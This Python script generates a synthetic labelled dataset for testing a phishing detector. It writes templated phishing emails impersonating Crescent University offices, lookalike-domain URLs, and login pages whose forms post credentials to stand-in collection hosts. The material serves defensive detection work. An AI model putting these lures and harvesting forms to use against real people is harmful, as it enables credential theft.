#!/usr/bin/env python3
"""
build_dataset.py  -  ONE command to (re)generate the whole labelled dataset
into the folders the detector actually reads:  samples/emails, samples/urls,
samples/pages, plus a matching rules/landing_pages_manifest.json.

Deterministic (fixed seed) and idempotent (overwrites, never appends).
Everything is fictional and synthetic. Run from the repo root:

    python build_dataset.py
"""

import csv
import json
import os
import random

random.seed(42)

ROOT = os.path.dirname(os.path.abspath(__file__))
EMAILS_DIR = os.path.join(ROOT, "samples", "emails")
URLS_DIR = os.path.join(ROOT, "samples", "urls")
PAGES_DIR = os.path.join(ROOT, "samples", "pages")
MANIFEST_PATH = os.path.join(ROOT, "rules", "landing_pages_manifest.json")

LEGIT_DOMAIN = "crescentuniversity.edu.ng"

# ---------------------------------------------------------------- emails
PHISH_DOMAINS = [
    "crescent-uni-secure-portal.tk", "crescent-support-desk.io", "crescentuniversity-alerts.ml",
    "secure-crescent-verify.ga", "crescent-id-check.cf", "crescent-help-desk.xyz",
    "crescentuniversity-notice.top", "crescent-student-center.work", "crescent-uni-portal-login.tk",
    "crescent-security-team.ml",
]
URGENCY_PHRASES = [
    "verify your account within 24 hours", "your account will be suspended",
    "confirm your password immediately", "urgent action required",
    "sign in immediately to avoid suspension", "reset your password now",
    "your session has expired, please re-confirm",
]
SOFT_PHRASES = [
    "when you get a chance, take a look at this", "no rush, just wanted to flag this",
    "let me know your thoughts whenever suits you", "happy to go over this at your convenience",
]
PHISH_SCENARIOS = [
    ("ICT", "ICT Support Desk", "Account security alert", "We detected unusual sign-in activity on your student portal. Please {urgency} by clicking the link below: {link}"),
    ("Bursary", "Bursary Department", "Fee payment system update required", "Due to a system migration, please {urgency}. Confirm your details here: {link}"),
    ("Security", "Security Alerts", "Multi-factor authentication issue", "Your MFA device could not be verified. {urgency}: {link}"),
    ("Registrar", "Office of the Registrar", "Shared course document requires sign-in", "A restricted academic document has been shared with you. {urgency} to view it: {link}"),
    ("ExamsOffice", "Exams and Records Office", "Exam result release - action needed", "Your exam result requires confirmation. {urgency} to view your result: {link}"),
    ("Scholarship", "Scholarship Office", "Scholarship award notification", "You have been shortlisted for an award. {urgency} to claim it: {link}"),
    ("Hostel", "Hostel Management", "Hostel allocation confirmation", "Your hostel room allocation needs confirmation. {urgency}: {link}"),
    ("VC", "Office of the Vice Chancellor", "Quick request", "I need you to handle something today, it's time sensitive. {urgency}: {link}"),
    ("Timetable", "Academic Affairs", "Exam timetable requires confirmation", "Please confirm your exam sitting by signing in. {urgency}: {link}"),
    ("ICTUpdate", "ICT Support Desk", "Mandatory portal software update", "A critical update requires your credentials to apply. {urgency}: {link}"),
    ("Library", "Library Services", "Library fine clearance", "Your library account has an outstanding fine. {urgency} to clear it: {link}"),
    ("Survey", "Student Affairs", "Student satisfaction survey - sign in required", "Please log in to complete the survey. {urgency}: {link}"),
    ("Convocation", "Convocation Office", "Convocation fee confirmation needed", "A pending convocation fee needs your sign-off. {urgency}: {link}"),
    ("SUG", "Students' Union Government", "Election voter verification needed", "We could not verify your voter status. {urgency} to resolve: {link}"),
    ("Transcript", "Exams and Records Office", "Transcript request ready for review", "Your transcript request is ready. {urgency} to download: {link}"),
]
LEGIT_SCENARIOS = [
    ("ICT", "ICT Support Desk", "Planned maintenance notice", "The student portal will be briefly unavailable for routine maintenance this weekend. No action is required."),
    ("Bursary", "Bursary Department", "Updated fee payment calendar", "Attached is the updated fee payment calendar for next session. No action needed on your part."),
    ("Security", "Security Team", "Annual security review reminder", "MFA re-registration opens next week; you'll get a prompt in the authenticator app when it's your turn."),
    ("Registrar", "Office of the Registrar", "Course registration form on the portal", "The course registration form is on the student portal under Academics > Registration as usual."),
    ("ExamsOffice", "Exams and Records Office", "Exam timetable published", "The exam timetable for this semester is now available on the portal for your reference."),
    ("Scholarship", "Scholarship Office", "Scholarship application calendar", "Here is this year's scholarship application calendar for your reference."),
    ("Hostel", "Hostel Management", "Hostel maintenance schedule", "Attached is the hostel maintenance schedule for your records, no action needed."),
    ("VC", "Vice Chancellor's Office", "Notes from Monday's town hall", "Attached are the notes from Monday's student town hall for your reference."),
    ("Timetable", "Academic Affairs", "Lecture moved to 3pm", "Just a heads up that tomorrow's lecture has moved to 3pm in the usual hall."),
    ("ICTUpdate", "ICT Support Desk", "New software available in the lab", "A new statistics tool is now available to request via the ICT computer lab."),
    ("Library", "Library Services", "Library opening hours update", "We've extended library opening hours following recent feedback."),
    ("Survey", "Student Affairs", "Thanks for completing the survey", "Thanks to everyone who completed last month's survey - results are on the portal."),
    ("Convocation", "Convocation Office", "Convocation calendar reminder", "Reminder that convocation rehearsal is this Friday - no submissions needed until then."),
    ("SUG", "Students' Union Government", "Election schedule update", "Voting booths will be at the usual locations this week - no action needed until then."),
    ("Transcript", "Exams and Records Office", "Transcript processing timeline", "Transcript requests will be processed from the 15th, as usual."),
]


def make_phish_email(idx, scenario):
    category, display_name, subject, body_template = scenario
    domain = random.choice(PHISH_DOMAINS)
    from_addr = f"{category.lower()}@{domain}"
    use_soft = (idx % 7 == 0)
    urgency = random.choice(SOFT_PHRASES) if use_soft else random.choice(URGENCY_PHRASES)
    link = f"http://{random.choice(['crescent-uni-portal-login.tk', '198.51.100.' + str(40+idx), 'crescent-uni-secure-portal.tk'])}/verify?id={idx}"
    body = body_template.format(urgency=urgency, link=link)
    reply_to_line = f"Reply-To: {category.lower()}@attacker-relay-{idx}.tk\n" if idx % 5 == 0 else ""
    content = (
        f'From: "{display_name}" <{from_addr}>\n'
        f"To: student{idx}@{LEGIT_DOMAIN}\n"
        f"Subject: {subject}\n{reply_to_line}"
        f"Date: Mon, 01 Jul 2024 09:00:{idx % 60:02d} +0000\n"
        f"Message-ID: <gen-phish-{idx}@{domain}>\n\n"
        f"Dear Student,\n\n{body}\n\nRegards,\n{display_name}\n"
    )
    return f"gen_phish_{idx:03d}_{category.lower()}.eml", content


def make_legit_email(idx, scenario):
    category, display_name, subject, body = scenario
    from_addr = f"{category.lower()}@{LEGIT_DOMAIN}"
    content = (
        f'From: "{display_name}" <{from_addr}>\n'
        f"To: student{idx}@{LEGIT_DOMAIN}\n"
        f"Subject: {subject}\n"
        f"Date: Mon, 01 Jul 2024 09:00:{idx % 60:02d} +0000\n"
        f"Message-ID: <gen-legit-{idx}@{LEGIT_DOMAIN}>\n\n"
        f"Hi all,\n\n{body}\n\nBest,\n{display_name}\n"
    )
    return f"gen_legit_{idx:03d}_{category.lower()}.eml", content


def build_emails():
    os.makedirs(EMAILS_DIR, exist_ok=True)
    rows = []
    idx = 1
    for _ in range(2):
        for sc in PHISH_SCENARIOS:
            fn, c = make_phish_email(idx, sc)
            open(os.path.join(EMAILS_DIR, fn), "w", encoding="utf-8").write(c)
            rows.append((fn, "phishing")); idx += 1
        for sc in LEGIT_SCENARIOS:
            fn, c = make_legit_email(idx, sc)
            open(os.path.join(EMAILS_DIR, fn), "w", encoding="utf-8").write(c)
            rows.append((fn, "legitimate")); idx += 1
    with open(os.path.join(EMAILS_DIR, "labels.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["filename", "label", "note"])
        for fn, lb in rows:
            w.writerow([fn, lb, "generated (templated synthetic sample)"])
    return len(rows)


# ---------------------------------------------------------------- urls
SUSPICIOUS_TLDS = [".tk", ".ml", ".ga", ".cf", ".gq", ".xyz", ".top", ".work"]
BRAND_TOKENS = ["crescent", "crescentuni", "crescent-uni"]
LOOKALIKE_PREFIXES = ["secure-", "login-", "verify-", "student-", "id-", "portal-", ""]
LOOKALIKE_SUFFIXES = ["-login", "-verify", "-portal", "-secure", "-alerts", ""]
LEGIT_SUBDOMAINS = ["portal", "drive", "support", "registrar", "bursary", "library", "exams", "hostel", "mail", "elearning"]
LEGIT_EXTERNAL = [
    "https://www.wikipedia.org/wiki/Security", "https://accounts.google.com/signin",
    "https://outlook.office.com/mail", "https://www.microsoft.com/en-us/security",
    "https://slack.com/signin", "https://zoom.us/signin",
]


def rand_ip():
    return random.choice(["198.51.100.", "203.0.113."]) + str(random.randint(2, 250))


def make_phishing_url(idx):
    pattern = idx % 6
    brand = random.choice(BRAND_TOKENS)
    if pattern == 0:
        return f"http://{rand_ip()}/login/verify?id={idx}"
    if pattern == 1:
        return f"http://{LEGIT_DOMAIN}@{brand}-verify-{idx}.tk/reset"
    if pattern == 2:
        return f"http://{random.choice(LOOKALIKE_PREFIXES)}{brand}{random.choice(LOOKALIKE_SUFFIXES)}{random.choice(SUSPICIOUS_TLDS)}/account"
    if pattern == 3:
        return f"https://{brand}-portal{random.choice(SUSPICIOUS_TLDS)}/docs/view?id={idx}"
    if pattern == 4:
        return f"http://login.secure.{brand}-id{random.choice(SUSPICIOUS_TLDS)}/verify"
    return f"http://{rand_ip()}:{random.choice([8080, 8443, 9090])}/verify"


def make_legit_url(idx):
    if idx % 4 == 0:
        return random.choice(LEGIT_EXTERNAL)
    return f"https://{random.choice(LEGIT_SUBDOMAINS)}.{LEGIT_DOMAIN}/resource/{idx}"


def build_urls():
    os.makedirs(URLS_DIR, exist_ok=True)
    rows = []
    for idx in range(1, 51):
        rows.append((make_phishing_url(idx), "phishing"))
    for idx in range(1, 41):
        rows.append((make_legit_url(idx), "legitimate"))
    with open(os.path.join(URLS_DIR, "urls.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["url", "label", "note"])
        for url, lb in rows:
            w.writerow([url, lb, "generated synthetic sample"])
    return len(rows)


# ---------------------------------------------------------------- landing pages
PAGE_TEMPLATE = """<!DOCTYPE html>
<!-- LABEL: {label} - fictional synthetic sample for detector testing, lab use only -->
<html lang="en">
<head><meta charset="UTF-8"><title>Crescent University - {title}</title></head>
<body>
  <h1>Crescent University {title}</h1>
  <form action="{action}" method="POST">
    <label>Matric Number</label><input type="text" name="username">
    <label>Password</label><input type="password" name="password">
    {hidden}
    <button type="submit">Sign in</button>
  </form>
</body>
</html>
"""

# Explicit 20-page set. Each phishing page carries at least one detectable
# signal (cross-domain form action -> L1). Clean pages post locally, no hidden fields.
PAGES = [
    # (filename, declared_host, label, action, hidden_fields)
    ("clean_baseline_portal.html", "portal.crescentuniversity.edu.ng", "legitimate", "/local-submit", ""),
    ("clean_variant_sso.html", "sso.crescentuniversity.edu.ng", "legitimate", "/local-submit", ""),
    ("phish_variant_cross_domain_post.html", "portal.crescentuniversity.edu.ng", "phishing", "http://198.51.100.77/collect", ""),
    ("phish_variant_hidden_fields.html", "verify.crescentuniversity.edu.ng", "phishing", "http://crescent-verify.tk/collect", '<input type="hidden" name="security_answer_probe" value="">'),
]
CLEAN_TITLES = ["Student Portal", "Single Sign-On", "Result Checker", "Hostel Portal", "Exam Portal", "Student Portal", "Single Sign-On", "Result Checker"]
PHISH_TITLES = ["Account Verification", "Security Check", "Password Reset", "Session Renewal", "Identity Confirmation", "Account Verification", "Security Check", "Password Reset"]
CLEAN_HOSTS = ["student1", "single2", "result3", "hostel4", "exam5", "student6", "single7", "result8"]
PHISH_HOSTS = ["account1", "security2", "password3", "session4", "identity5", "account6", "security7", "password8"]
CROSS_DOMAIN_ACTIONS = ["http://127.0.0.1:5000/collect", "http://198.51.100.77/collect", "http://crescent-verify.tk/collect"]
HIDDEN_SETS = [
    '<input type="hidden" name="matric_id_guess" value="">',
    '<input type="hidden" name="campaign_tag" value="batch">\n    <input type="hidden" name="security_answer_probe" value="">',
    '<input type="hidden" name="device_fingerprint" value="">',
]

for i in range(8):
    PAGES.append((f"gen_clean_{i+1:03d}.html", f"{CLEAN_HOSTS[i]}.crescentuniversity.edu.ng",
                  "legitimate", "/local-submit", ""))
for i in range(8):
    # every phishing page gets a cross-domain action so L1 (weight 4) fires;
    # some also carry hidden fields so L2 co-fires. This is the intended,
    # detectable phishing behaviour.
    hidden = HIDDEN_SETS[i % len(HIDDEN_SETS)] if i % 2 == 0 else ""
    PAGES.append((f"gen_phish_{i+1:03d}.html", f"{PHISH_HOSTS[i]}.crescentuniversity.edu.ng",
                  "phishing", CROSS_DOMAIN_ACTIONS[i % len(CROSS_DOMAIN_ACTIONS)], hidden))


def build_pages():
    os.makedirs(PAGES_DIR, exist_ok=True)
    manifest = []
    label_rows = []
    for i, (fn, host, label, action, hidden) in enumerate(PAGES):
        title = (PHISH_TITLES if label == "phishing" else CLEAN_TITLES)[i % 8]
        html = PAGE_TEMPLATE.format(label=label, title=title, action=action, hidden=hidden)
        open(os.path.join(PAGES_DIR, fn), "w", encoding="utf-8").write(html)
        manifest.append({"filename": fn, "declared_host": host})
        label_rows.append((fn, label))
    with open(MANIFEST_PATH, "w", encoding="utf-8") as f:
        json.dump(manifest, f, indent=2)
    with open(os.path.join(PAGES_DIR, "labels.csv"), "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f); w.writerow(["filename", "label", "note"])
        for fn, lb in label_rows:
            w.writerow([fn, lb, "generated synthetic sample"])
    return len(PAGES)


def main():
    ne = build_emails()
    nu = build_urls()
    npg = build_pages()
    print(f"Dataset rebuilt:")
    print(f"  {ne} emails       -> samples/emails/")
    print(f"  {nu} urls         -> samples/urls/urls.csv")
    print(f"  {npg} landing pages -> samples/pages/  (+ rules/landing_pages_manifest.json)")
    print(f"  total labelled samples: {ne + nu + npg}")


if __name__ == "__main__":
    main()
